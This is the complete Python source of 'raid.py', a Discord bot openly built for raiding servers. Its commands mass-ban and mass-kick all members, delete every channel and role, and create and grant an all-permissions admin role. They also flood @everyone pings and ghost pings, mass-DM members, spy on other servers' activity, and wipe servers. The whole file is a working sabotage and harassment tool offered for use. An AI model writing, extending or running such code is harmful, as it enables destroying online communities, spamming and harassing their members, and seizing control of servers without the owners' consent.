import discord
from discord.ext import commands
import asyncio
import json
import os
import colorama
from colorama import *
just_fix_windows_console()

os.system("title -- raid.py --")
os.system("cls")

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='raid.py ', intents=intents)

embed_icon_url = "https://getzumix.fun/logos/raid.png"

admin_uid = None
spy_file_path = "/bin/Spy.json"

if not os.path.exists(spy_file_path):
    os.makedirs(os.path.dirname(spy_file_path), exist_ok=True)
    with open(spy_file_path, 'w') as f:
        json.dump({}, f)

with open(spy_file_path, 'r') as f:
    spies = json.load(f)

active_spies = {}

config_file = 'startup.config.json'
with open(config_file, 'r') as f:
    config = json.load(f)

bot_status = config.get("BotStatus", "Online")
auto_connect = config["AutoConnect"]
auto_connect_active = auto_connect.get("IsActive", False)
bot_token = auto_connect.get("BotToken", "")

@bot.event
async def on_ready():
    os.system("cls")
    os.system(f"title raid.py - Connected @ {bot.user}")
    print(f'''{Fore.RED}
 ██████╗  █████╗ ██╗██████╗    ██████╗ ██╗   ██╗  == raid.py version 1.0.0 release ==
 ██╔══██╗██╔══██╗██║██╔══██╗   ██╔══██╗╚██╗ ██╔╝  {Fore.GREEN}Connected: {Fore.WHITE}{bot.user}{Fore.RED}
 ██████╔╝███████║██║██║  ██║   ██████╔╝ ╚████╔╝   {Fore.GREEN}Admin ID: {Fore.WHITE}{admin_uid}{Fore.RED}
 ██╔══██╗██╔══██║██║██║  ██║   ██╔═══╝   ╚██╔╝    {Fore.GREEN}Credits: {Fore.WHITE}@94to{Fore.RED}
 ██║  ██║██║  ██║██║██████╔╝██╗██║        ██║     {Fore.WHITE}Use "raid.py help" to view commands{Fore.RED}
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝╚═╝        ╚═╝   
{Fore.WHITE}''')
    await bot.change_presence(activity=discord.Game(name=f"{bot_status} | raid.py"))

async def send_starting_message(ctx):
    await ctx.send(embed=discord.Embed(
        title="Starting Process...",
        description="Please wait while we process your request.",
        color=discord.Color.blue()
    ).set_footer(text="Operation in progress", icon_url=embed_icon_url))

@bot.command()
async def _rotatingactivity(ctx, *, values: str):
    value_list = [value.strip() for value in values.split(',')]
    if len(value_list) < 2:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="Please provide at least two values, separated by commas.",
            color=discord.Color.red()
        ))
        return

    for value in value_list:
        await bot.change_presence(activity=discord.Game(name=value))
        await asyncio.sleep(5)  # Wait for 5 seconds

    await ctx.send(embed=discord.Embed(
        title="Rotating Activity",
        description=f"Rotating through activities: {', '.join(value_list)}",
        color=discord.Color.green()
    ))

@bot.command()
async def _announce(ctx, *, message: str):
    success_count = 0
    fail_count = 0
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(message)
                success_count += 1
            except discord.Forbidden:
                fail_count += 1
            except discord.HTTPException as e:
                if e.code == 50013:
                    continue
                elif e.code == 429:
                    await ctx.send(embed=discord.Embed(
                        title="Rate Limit Exceeded",
                        description="Could not finish sending announcements due to rate limiting.",
                        color=discord.Color.red()
                    ))
                    return

    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.send(message)
                success_count += 1
            except discord.Forbidden:
                fail_count += 1
            except discord.HTTPException as e:
                if e.code == 429:  # Rate limit exceeded
                    await ctx.send(embed=discord.Embed(
                        title="Rate Limit Exceeded",
                        description="Could not finish sending DMs due to rate limiting.",
                        color=discord.Color.red()
                    ))
                    return

    await ctx.send(embed=discord.Embed(
        title="Announcement Sent",
        description=f"Sent to {success_count} channels and DMs. Failed to send to {fail_count}.",
        color=discord.Color.green()
    ))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _unlockchannels(ctx):
    role_name = f"raid.py XD{len([r for r in ctx.guild.roles if r.name.startswith('raid.py XD')]) + 1}"
    role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(send_messages=True, read_messages=True))

    for channel in ctx.guild.channels:
        await channel.set_permissions(role, read_messages=True, send_messages=True)

    await ctx.send(embed=discord.Embed(
        title="Channels Unlocked",
        description=f"Created role '{role_name}' and unlocked all channels.",
        color=discord.Color.green()
    ))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _giveadmin(ctx, member: discord.Member):
    role_name = f"raid.py admin{len([r for r in ctx.guild.roles if r.name.startswith('raid.py admin')]) + 1}"
    permissions = discord.Permissions.all()
    role = await ctx.guild.create_role(name=role_name, permissions=permissions)

    await member.add_roles(role)

    await ctx.send(embed=discord.Embed(
        title="Admin Role Given",
        description=f"Assigned role '{role_name}' to {member.mention}.",
        color=discord.Color.green()
    ))

@bot.command()
@commands.has_permissions(administrator=True)
async def _banserver(ctx):
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.ban(reason="dsc.gg/raidtools")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

    await ctx.send(embed=discord.Embed(
        title="Server Banned",
        description="All members have been banned from the server.",
        color=discord.Color.red()
    ))

@bot.command()
@commands.has_permissions(administrator=True)
async def _kickserver(ctx):
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.kick(reason="dsc.gg/raidtools")
            except Exception as e:
                print(f"Failed to kick {member.name}: {e}")

    await ctx.send(embed=discord.Embed(
        title="Server Kicked",
        description="All members have been kicked from the server.",
        color=discord.Color.red()
    ))

@bot.command()
@commands.has_permissions(manage_channels=True)
async def _startspy(ctx, server_id: int, channel_id: int):
    if server_id in active_spies:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="A spy is already active for this server.",
            color=discord.Color.red()
        ))
        return

    if len(active_spies) >= 5:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="Maximum number of active spies reached (5).",
            color=discord.Color.red()
        ))
        return

    active_spies[server_id] = channel_id
    spies[server_id] = {"channel_id": channel_id, "logs": []}
    
    # Save the updated spy data
    with open(spy_file_path, 'w') as f:
        json.dump(spies, f, indent=4)

    await ctx.send(embed=discord.Embed(
        title="Spy Started",
        description=f"Started spying on server ID {server_id} and logging to channel ID {channel_id}.",
        color=discord.Color.green()
    ))

@bot.command()
@commands.has_permissions(manage_channels=True)
async def _stopspy(ctx, server_id: int):
    if server_id not in active_spies:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="No active spy found for this server.",
            color=discord.Color.red()
        ))
        return

    del active_spies[server_id]
    del spies[server_id]

    # Save the updated spy data
    with open(spy_file_path, 'w') as f:
        json.dump(spies, f, indent=4)

    await ctx.send(embed=discord.Embed(
        title="Spy Stopped",
        description=f"Stopped spying on server ID {server_id}.",
        color=discord.Color.green()
    ))

@bot.command()
async def _checkspies(ctx):
    if not active_spies:
        await ctx.send(embed=discord.Embed(
            title="No Active Spies",
            description="There are no active spies currently.",
            color=discord.Color.red()
        ))
        return

    embed = discord.Embed(title="Active Spies", color=discord.Color.blue())
    for server_id, channel_id in active_spies.items():
        embed.add_field(name=f"Server ID: {server_id}", value=f"Channel ID: {channel_id}", inline=False)

    await ctx.send(embed=embed)

@bot.event
async def on_guild_channel_create(channel):
    await log_event(channel.guild.id, "Channel Created", f"Channel '{channel.name}' created in {channel.guild.name}.", channel.id)

@bot.event
async def on_guild_channel_update(before, after):
    if before.name != after.name:
        await log_event(after.guild.id, "Channel Updated", f"Channel name changed from '{before.name}' to '{after.name}'.", after.id)

@bot.event
async def on_guild_channel_delete(channel):
    """Log channel deletion events."""
    await log_event(channel.guild.id, "Channel Deleted", f"Channel '{channel.name}' deleted from {channel.guild.name}.", channel.id)

@bot.event
async def on_member_join(member):
    """Log member join events."""
    await log_event(member.guild.id, "Member Joined", f"Member '{member.name}' has joined the server.", None)

@bot.event
async def on_member_remove(member):
    """Log member removal events."""
    await log_event(member.guild.id, "Member Left", f"Member '{member.name}' has left the server.", None)

async def log_event(server_id, title, description, channel_id):
    """Log events to the appropriate channel."""
    if server_id in active_spies:
        channel_id = active_spies[server_id]
        channel = bot.get_channel(channel_id)
        if channel:
            embed = discord.Embed(title=title, description=description, color=discord.Color.orange())
            await channel.send(embed=embed)
        else:
            # If the channel no longer exists, delete the spy and notify the admin
            del active_spies[server_id]
            del spies[server_id]
            with open(spy_file_path, 'w') as f:
                json.dump(spies, f, indent=4)
            admin_user = bot.get_user(admin_uid)
            if admin_user:
                await admin_user.send(f"The spy for server ID {server_id} has been deleted because the logging channel no longer exists.")
    

@bot.command()
@commands.has_permissions(manage_channels=True)
async def _dumpserver(ctx):
    await send_starting_message(ctx)

    server_data = {
        'name': ctx.guild.name,
        'roles': [],
        'channels': [],
    }

    # Dump roles
    for role in ctx.guild.roles:
        if role.name != "@everyone":  # Ignore @everyone role
            server_data['roles'].append({
                'name': role.name,
                'permissions': [perm for perm, value in role.permissions if value],
                'color': str(role.color)
            })

    # Dump channels
    for channel in ctx.guild.channels:
        channel_data = {
            'name': channel.name,
            'type': str(channel.type),
            'position': channel.position,
            'permissions': {}
        }
        for perm in channel.overwrites:
            channel_data['permissions'][str(perm)] = {
                'allow': channel.overwrites[perm].allow,
                'deny': channel.overwrites[perm].deny,
            }
        server_data['channels'].append(channel_data)

    # Save to JSON file
    server_id = ctx.guild.id
    with open(f"{server_id}.json", "w") as f:
        json.dump(server_data, f, indent=4)

    await ctx.send(embed=discord.Embed(
        title="Server Dumped",
        description=f"Server data saved to {server_id}.json",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_guild=True)
async def _loadserver(ctx, server_id: int):
    await send_starting_message(ctx)

    try:
        with open(f"{server_id}.json", "r") as f:
            server_data = json.load(f)
    except FileNotFoundError:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="JSON file not found.",
            color=discord.Color.red()
        ).set_footer(text="Operation failed", icon_url=embed_icon_url))
        return

    # Wipe the server except for the @everyone role
    await ctx.guild.edit(name='Wiping server...')  # Temporary name during wipe
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except discord.Forbidden:
                print(f"{Fore.RED}[!] {Fore.WHITE}Failed to delete role {role.name}: Missing Permissions")

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{Fore.RED}[!] {Fore.WHITE}Failed to delete channel {channel.name}: Missing Permissions")

    # Set server name
    await ctx.guild.edit(name=server_data['name'])

    # Create roles
    for role_info in server_data['roles']:
        color = discord.Color.from_str(role_info['color'])
        permissions = discord.Permissions()
        for perm in role_info['permissions']:
            setattr(permissions, perm, True)
        await ctx.guild.create_role(name=role_info['name'], permissions=permissions, color=color)

    # Create channels
    for channel_info in server_data['channels']:
        permissions = {}
        for perm_name, perm_values in channel_info['permissions'].items():
            overwrite = discord.PermissionOverwrite()
            overwrite.set_permissions(allow=perm_values['allow'], deny=perm_values['deny'])
            permissions[discord.utils.get(ctx.guild.roles, name=perm_name)] = overwrite

        if channel_info['type'] == 'text':
            await ctx.guild.create_text_channel(channel_info['name'], position=channel_info['position'], overwrites=permissions)
        elif channel_info['type'] == 'voice':
            await ctx.guild.create_voice_channel(channel_info['name'], position=channel_info['position'], overwrites=permissions)

    await ctx.send(embed=discord.Embed(
        title="Server Loaded",
        description="Server data has been restored from JSON.",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))


@bot.command()
@commands.has_permissions(manage_channels=True)
async def _deletechannels(ctx):
    await send_starting_message(ctx)
    for channel in ctx.guild.channels:
        await channel.delete()
    
    await ctx.guild.create_text_channel("general")
    
    await ctx.send(embed=discord.Embed(
        title="Channels Deleted",
        description="All channels and categories have been deleted. A new channel named 'general' has been created.",
        color=discord.Color.red()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_channels=True)
async def _addchannels(ctx, amount: int, *, name: str):
    await send_starting_message(ctx)
    for i in range(amount):
        await ctx.guild.create_text_channel(f"{name}-{i+1}")
    await ctx.send(embed=discord.Embed(
        title="Channels Created",
        description=f"Created {amount} channels with the name '{name}'.",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_messages=True)
async def _globalmessage(ctx, *, message: str):
    await send_starting_message(ctx)
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(f"@everyone {message}")
        except Exception as e:
            print(f"Failed to send message in {channel.name}: {e}")
    await ctx.send(embed=discord.Embed(
        title="Global Message Sent",
        description="Message sent to all channels.",
        color=discord.Color.blue()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_messages=True)
async def _dmusers(ctx, *, message: str):
    await send_starting_message(ctx)
    success_count = 0
    fail_count = 0
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.send(message)
                success_count += 1
            except Exception as e:
                fail_count += 1
                print(f"Failed to DM {member.name}: {e}")

    await ctx.send(embed=discord.Embed(
        title="DM Users",
        description=f"Sent DMs to {success_count} users. Failed to send to {fail_count} users.",
        color=discord.Color.purple()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def _nickname(ctx, *, text: str):
    await send_starting_message(ctx)
    await ctx.guild.me.edit(nick=text)
    await ctx.send(embed=discord.Embed(
        title="Nickname Changed",
        description=f"Bot's nickname changed to '{text}'.",
        color=discord.Color.orange()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_messages=True)
async def _silentping(ctx, amount: int):
    await send_starting_message(ctx)
    for _ in range(amount):
        msg = await ctx.send("@everyone Pinging silently...")
        await msg.delete()
        await asyncio.sleep(1)  # Wait 1 second between pings

    await ctx.send(embed=discord.Embed(
        title="Silent Pings Sent",
        description=f"Sent {amount} silent pings to @everyone.",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
async def _status(ctx, status: str):
    await send_starting_message(ctx)
    statuses = {
        "idle": discord.Status.idle,
        "dnd": discord.Status.dnd,
        "online": discord.Status.online,
        "invisible": discord.Status.invisible,
    }
    if status in statuses:
        await bot.change_presence(status=statuses[status])
        await ctx.send(embed=discord.Embed(
            title="Status Changed",
            description=f"Bot's status changed to '{status}'.",
            color=discord.Color.blue()
        ).set_footer(text="Operation completed", icon_url=embed_icon_url))
    else:
        await ctx.send(embed=discord.Embed(
            title="Invalid Status",
            description="Please provide a valid status: idle, dnd, online, invisible.",
            color=discord.Color.red()
        ).set_footer(text="Error occurred", icon_url=embed_icon_url))

@bot.command()
async def _activity(ctx, *, text: str):
    await send_starting_message(ctx)
    await bot.change_presence(activity=discord.Game(name=text))
    await ctx.send(embed=discord.Embed(
        title="Activity Changed",
        description=f"Bot's activity changed to 'Playing {text}'.",
        color=discord.Color.blue()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _deleteroles(ctx):
    await send_starting_message(ctx)
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            await role.delete()
    await ctx.send(embed=discord.Embed(
        title="Roles Deleted",
        description="All roles except '@everyone' have been deleted.",
        color=discord.Color.red()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _assignrole(ctx, member: discord.Member, role: discord.Role):
    await send_starting_message(ctx)
    await member.add_roles(role)
    await ctx.send(embed=discord.Embed(
        title="Role Assigned",
        description=f"Assigned role '{role.name}' to {member.name}.",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _takerole(ctx, member: discord.Member, role: discord.Role):
    await send_starting_message(ctx)
    await member.remove_roles(role)
    await ctx.send(embed=discord.Embed(
        title="Role Removed",
        description=f"Removed role '{role.name}' from {member.name}.",
        color=discord.Color.red()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_roles=True)
async def _createroles(ctx, amount: int, *, name: str):
    await send_starting_message(ctx)
    for i in range(amount):
        await ctx.guild.create_role(name=f"{name} {i+1}")
    await ctx.send(embed=discord.Embed(
        title="Roles Created",
        description=f"Created {amount} roles with the name '{name}'.",
        color=discord.Color.green()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_guild=True)
async def _setservername(ctx, *, name: str):
    await send_starting_message(ctx)
    await ctx.guild.edit(name=name)
    await ctx.send(embed=discord.Embed(
        title="Server Name Changed",
        description=f"Server name changed to '{name}'.",
        color=discord.Color.orange()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@bot.command()
@commands.has_permissions(manage_guild=True)
async def _leaveserver(ctx):
    await send_starting_message(ctx)
    await ctx.guild.leave()
    await ctx.send(embed=discord.Embed(
        title="Left Server",
        description="The bot has left the server.",
        color=discord.Color.red()
    ).set_footer(text="Operation completed", icon_url=embed_icon_url))

@_deletechannels.error
@_addchannels.error
@_globalmessage.error
@_dmusers.error
@_nickname.error
@_silentping.error
@_status.error
@_activity.error
@_deleteroles.error
@_assignrole.error
@_takerole.error
@_createroles.error
@_setservername.error
@_leaveserver.error
async def command_error(ctx, error):
    embed_icon_url = "URL_TO_YOUR_ICON"  # Replace with your embed icon URL
    if isinstance(error, commands.MissingPermissions):
        await ctx.send(embed=discord.Embed(
            title="Permission Denied",
            description="You do not have permission to use this command.",
            color=discord.Color.red()
        ).set_footer(text="Error occurred", icon_url=embed_icon_url))
    elif isinstance(error, commands.BadArgument):
        await ctx.send(embed=discord.Embed(
            title="Invalid Argument",
            description="Please provide a valid argument. Check command usage.",
            color=discord.Color.orange()
        ).set_footer(text="Error occurred", icon_url=embed_icon_url))
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send(embed=discord.Embed(
            title="Command Not Found",
            description="This command does not exist. Please check the command name.",
            color=discord.Color.red()
        ).set_footer(text="Error occurred"))


async def check_admin(ctx):
    if ctx.author.id != admin_uid:
        await ctx.send(embed=discord.Embed(
            title="Access Denied",
            description="You do not have permission to use this bot.",
            color=discord.Color.red()
        ).set_footer(text="Error occurred", icon_url=embed_icon_url))
        return False
    return True

@bot.before_invoke
async def before_invoke(ctx):
    if not await check_admin(ctx):
        raise commands.CommandError("Access denied.")

if not auto_connect_active:
    bottoken = input("<raid.py> Enter token : ")
else:
    bottoken = bot_token
admin_uid = int(input("<raid.py> Enter Admin UID : "))
bot.run(bottoken)
